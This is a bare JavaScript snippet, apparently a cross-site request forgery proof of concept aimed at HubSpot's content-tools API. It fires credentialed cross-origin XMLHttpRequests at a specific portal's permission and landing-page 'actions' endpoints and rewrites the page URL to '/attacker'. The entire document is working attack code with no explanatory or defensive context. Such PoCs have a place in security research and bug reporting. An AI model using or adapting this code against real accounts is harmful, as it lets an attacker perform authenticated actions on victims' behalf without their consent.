var xhr = new XMLHttpRequest();

xhr.open("GET", "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/has-permission?portalId=25502480&callback=jsonpHandler", true);
xhr.send(null);

xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
	xhr = new XMLHttpRequest();
        xhr.open("GET", "https://app-eu1.hubspot.com/content-tools-menu/api/v1/tools-menu/landing-pages/45875820775/actions?portalId=25502480&callback=jsonpHandler");
	xhr.setRequestHeader("accept", "*\/*");
	xhr.setRequestHeader("accept-language", "fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7");
	xhr.withCredentials = true;
	var body = "";
	var aBody = new Uint8Array(body.length);
	for (var i = 0; i < aBody.length; i++)
		aBody[i] = body.charCodeAt(i);
	window.history.replaceState(null, '', '/attacker');
	xhr.send(new Blob([aBody]));
    }
}
